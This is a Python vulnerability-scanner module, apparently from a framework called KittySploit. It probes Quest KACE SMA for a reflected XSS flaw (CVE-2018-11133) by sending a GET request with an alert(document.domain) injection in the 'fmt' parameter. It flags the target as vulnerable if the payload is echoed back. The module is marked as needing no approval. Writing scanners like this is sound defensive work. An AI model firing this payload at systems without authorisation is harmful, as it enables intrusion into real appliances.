#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The 'fmt' parameter of the '/common/run_cross_report."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': "Quest KACE SMA /common/run_cross_report.php 'fmt' XSS Detection",
        'description': "The 'fmt' parameter of the '/common/run_cross_report.php' script in the the Quest KACE System Management Appliance 8.0.318 is vulnerable to cross-site scripting.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'xss', 'quest', 'kace', 'sma', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2018-11133',
            'https://www.coresecurity.com/advisories/quest-kace-system-management-appliance-multiple-vulnerabilities',
        ],
        'cve': 'CVE-2018-11133',
    }

    def run(self):
        path = "/common/run_cross_report.php?uniqueId=366314513&id=585&org=1&fmt=xls34403')%3balert(document.domain)%2f%2f952"
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ("xls34403');alert(document.domain)//952');", 'k-run-report-message',)
        if all(m in body for m in body_all):
            self.set_info(severity='medium', reason="Quest KACE SMA /common/run_cross_report.php 'fmt' XSS detected", path=path)
            return True
        return False

